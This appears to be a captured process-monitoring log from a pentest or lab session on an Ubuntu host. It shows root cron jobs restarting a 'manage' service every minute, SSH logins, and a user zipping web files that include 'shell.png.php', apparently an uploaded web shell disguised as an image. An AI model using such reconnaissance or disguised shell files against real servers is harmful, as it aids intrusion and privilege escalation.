+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14205  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:28 [34;1mCMD: UID=0     PID=14204  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14222  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14221  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14220  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14219  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14218  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14217  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14216  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14215  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14214  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14213  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:31:38 [34;1mCMD: UID=0     PID=14223  | (time-dir) [0m
+2025/01/16 12:31:48 [34;1mCMD: UID=0     PID=14224  | [0m
+2025/01/16 12:32:01 [34;1mCMD: UID=0     PID=14225  | /usr/sbin/CRON -f [0m
+2025/01/16 12:32:01 [34;1mCMD: UID=0     PID=14226  | /usr/sbin/CRON -f [0m
+2025/01/16 12:32:01 [34;1mCMD: UID=0     PID=14227  | systemctl restart manage [0m
+2025/01/16 12:32:01 [34;1mCMD: UID=0     PID=14228  | /sbin/init [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14237  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14236  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14235  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14234  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14233  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14232  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14231  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14230  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14229  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:02 [34;1mCMD: UID=0     PID=14238  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:05 [34;1mCMD: UID=0     PID=14239  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:32:06 [34;1mCMD: UID=109   PID=14242  | sshd: [net]          [0m
+2025/01/16 12:32:07 [34;1mCMD: UID=0     PID=14243  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:32:07 [34;1mCMD: UID=0     PID=14244  | /sbin/init [0m
+2025/01/16 12:32:07 [34;1mCMD: UID=0     PID=14245  | (sd-pam) [0m
+2025/01/16 12:32:07 [34;1mCMD: UID=0     PID=14246  | (sd-executor) [0m
+2025/01/16 12:32:07 [34;1mCMD: UID=0     PID=14247  | (direxec) [0m
+2025/01/16 12:32:09 [34;1mCMD: UID=0     PID=14249  | /lib/systemd/systemd --user [0m
+2025/01/16 12:32:09 [34;1mCMD: UID=0     PID=14250  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:32:09 [34;1mCMD: UID=0     PID=14251  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14254  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14252  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14258  | grep -c ^processor /proc/cpuinfo [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14257  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14272  | grep -q -m 1 . [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14269  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14280  | cut -d  -f4 [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14279  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14278  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:32:10 [34;1mCMD: UID=0     PID=14277  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:32:11 [34;1mCMD: UID=0     PID=14282  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:32:11 [34;1mCMD: UID=0     PID=14283  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:32:12 [34;1mCMD: UID=0     PID=14284  | [0m
+2025/01/16 12:32:12 [34;1mCMD: UID=0     PID=14286  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:32:12 [34;1mCMD: UID=0     PID=14287  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:32:12 [34;1mCMD: UID=0     PID=14288  | systemd-detect-virt -q -c [0m
+2025/01/16 12:32:12 [34;1mCMD: UID=0     PID=14289  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:32:12 [34;1mCMD: UID=0     PID=14290  | ???[0m
+2025/01/16 12:32:12 [34;1mCMD: UID=0     PID=14291  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14293  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14294  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14295  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14297  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14298  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14308  | sort -r [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14307  | grep -E overlayroot|/media/root-ro|/media/root-rw /proc/mounts [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14306  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14305  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14316  | /bin/sh -e /usr/lib/update-notifier/update-motd-reboot-required [0m
+2025/01/16 12:32:13 [34;1mCMD: UID=0     PID=14317  | sshd: root@pts/2     [0m
+2025/01/16 12:32:14 [34;1mCMD: UID=0     PID=14321  | -bash [0m
+2025/01/16 12:32:14 [34;1mCMD: UID=0     PID=14320  | [0m
+2025/01/16 12:32:14 [34;1mCMD: UID=0     PID=14322  | -bash [0m
+2025/01/16 12:32:14 [34;1mCMD: UID=0     PID=14327  | [0m
+2025/01/16 12:32:14 [34;1mCMD: UID=0     PID=14328  | -bash [0m
+2025/01/16 12:32:14 [34;1mCMD: UID=0     PID=14329  | su - orville [0m
+2025/01/16 12:32:15 [32;1mCMD: UID=1003  PID=14331  | [0m
+2025/01/16 12:32:15 [32;1mCMD: UID=1003  PID=14333  | -bash [0m
+2025/01/16 12:32:15 [32;1mCMD: UID=1003  PID=14332  | -bash [0m
+2025/01/16 12:32:15 [32;1mCMD: UID=1003  PID=14334  | -bash [0m
+2025/01/16 12:32:15 [32;1mCMD: UID=1003  PID=14338  | dircolors -b [0m
+2025/01/16 12:32:16 [32;1mCMD: UID=1003  PID=14339  | [0m
+2025/01/16 12:32:22 [32;1mCMD: UID=1003  PID=14340  | [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14341  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14350  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14349  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14348  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14347  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14346  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14345  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14344  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14343  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:29 [34;1mCMD: UID=0     PID=14342  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14361  | [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14360  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14359  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14358  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14357  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14356  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14355  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14354  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14353  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14352  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:32:39 [34;1mCMD: UID=0     PID=14351  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:01 [34;1mCMD: UID=0     PID=14362  | /usr/sbin/CRON -f [0m
+2025/01/16 12:33:01 [34;1mCMD: UID=0     PID=14363  | /usr/sbin/CRON -f [0m
+2025/01/16 12:33:01 [34;1mCMD: UID=0     PID=14364  | systemctl restart manage [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14365  | /sbin/init [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14368  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14367  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14366  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14375  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14374  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14373  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14372  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14371  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14370  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:02 [34;1mCMD: UID=0     PID=14369  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:06 [34;1mCMD: UID=0     PID=14376  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:33:06 [34;1mCMD: UID=109   PID=14378  | sshd: [net]          [0m
+2025/01/16 12:33:07 [34;1mCMD: UID=0     PID=14380  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:33:07 [34;1mCMD: UID=0     PID=14381  | (systemd) [0m
+2025/01/16 12:33:07 [34;1mCMD: UID=0     PID=14382  | [0m
+2025/01/16 12:33:08 [34;1mCMD: UID=0     PID=14383  | (sd-pam) [0m
+2025/01/16 12:33:08 [34;1mCMD: UID=0     PID=14384  | (sd-executor) [0m
+2025/01/16 12:33:08 [34;1mCMD: UID=0     PID=14385  | (direxec) [0m
+2025/01/16 12:33:08 [34;1mCMD: UID=0     PID=14386  | (sd-executor) [0m
+2025/01/16 12:33:09 [34;1mCMD: UID=0     PID=14387  | /lib/systemd/systemd --user [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14389  | [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14388  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14390  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14396  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14395  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14400  | cut -f1 -d   /proc/loadavg [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14399  | bc [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14398  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:33:10 [34;1mCMD: UID=0     PID=14397  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14405  | cut -c -80 [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14404  | [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14403  | [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14402  | [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14401  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14410  | [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14409  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14407  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14411  | [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14415  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14418  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14417  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:33:11 [34;1mCMD: UID=0     PID=14416  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:33:12 [34;1mCMD: UID=0     PID=14419  | id -u [0m
+2025/01/16 12:33:12 [34;1mCMD: UID=0     PID=14420  | date +%s [0m
+2025/01/16 12:33:12 [34;1mCMD: UID=0     PID=14421  | /bin/sh -e /usr/lib/ubuntu-release-upgrader/release-upgrade-motd [0m
+2025/01/16 12:33:12 [34;1mCMD: UID=0     PID=14422  | [0m
+2025/01/16 12:33:12 [34;1mCMD: UID=0     PID=14423  | [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14424  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14426  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14425  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14427  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14428  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14430  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14429  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14431  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14432  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:33:13 [34;1mCMD: UID=0     PID=14433  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14434  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14435  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14436  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14438  | id -u [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14443  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14446  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14445  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14444  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14447  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14448  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14449  | ???[0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14452  | date +%s [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14453  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14454  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:33:14 [34;1mCMD: UID=0     PID=14455  | sshd: root@pts/2     [0m
+2025/01/16 12:33:15 [34;1mCMD: UID=0     PID=14456  | -bash [0m
+2025/01/16 12:33:15 [34;1mCMD: UID=0     PID=14459  | -bash [0m
+2025/01/16 12:33:15 [34;1mCMD: UID=0     PID=14458  | -bash [0m
+2025/01/16 12:33:15 [34;1mCMD: UID=0     PID=14460  | -bash [0m
+2025/01/16 12:33:15 [34;1mCMD: UID=0     PID=14464  | dircolors -b [0m
+2025/01/16 12:33:15 [34;1mCMD: UID=0     PID=14465  | -bash [0m
+2025/01/16 12:33:15 [34;1mCMD: UID=0     PID=14466  | su - orville [0m
+2025/01/16 12:33:16 [32;1mCMD: UID=1003  PID=14468  | -bash [0m
+2025/01/16 12:33:16 [32;1mCMD: UID=1003  PID=14467  | -bash [0m
+2025/01/16 12:33:16 [32;1mCMD: UID=1003  PID=14472  | -bash [0m
+2025/01/16 12:33:16 [32;1mCMD: UID=1003  PID=14476  | dircolors -b [0m
+2025/01/16 12:33:18 [32;1mCMD: UID=1003  PID=14477  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:33:23 [32;1mCMD: UID=1003  PID=14478  | [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14483  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14482  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14481  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14480  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14479  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14488  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14487  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14486  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14485  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:30 [34;1mCMD: UID=0     PID=14484  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14498  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14497  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14496  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14495  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14494  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14493  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14492  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14491  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14490  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14489  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:33:40 [34;1mCMD: UID=0     PID=14499  | /lib/systemd/systemd-user-runtime-dir stop 0 [0m
+2025/01/16 12:33:41 [34;1mCMD: UID=0     PID=14500  | [0m
+^C
+
+Script done on 2025-01-16 15:33:42+03:00 [COMMAND_EXIT_CODE="1"]
